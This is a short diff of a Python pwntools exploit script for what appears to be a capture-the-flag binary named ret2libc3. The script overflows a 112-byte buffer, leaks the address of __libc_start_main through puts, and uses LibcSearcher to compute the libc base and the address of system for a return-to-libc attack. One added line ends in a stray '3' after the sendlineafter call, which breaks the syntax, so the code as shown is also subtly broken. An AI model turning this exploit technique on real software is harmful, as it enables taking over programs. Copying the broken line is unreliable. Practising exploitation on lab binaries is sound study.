@@ -1,4 +1,3 @@
-#!/usr/bin/env python
 from pwn import *
 sys.path.append('/home/li/Desktop/LibcSearcher')
 from LibcSearcher import LibcSearcher # type: ignore
@@ -12,10 +11,10 @@ main = ret2libc3.symbols['main']
 
 print("leak libc_start_main_got addr and return to main again")
 payload = flat([b'A' * 112, puts_plt, main, libc_start_main_got])
-sh.sendlineafter(b'Can you find it !?', payload)
-
+sh.sendlineafter(b'Can you find it !?', payload)3
 print("get the related addr")
 libc_start_main_addr = u32(sh.recv()[0:4])
+
 libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
 libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
 system_addr = libcbase + libc.dump('system')
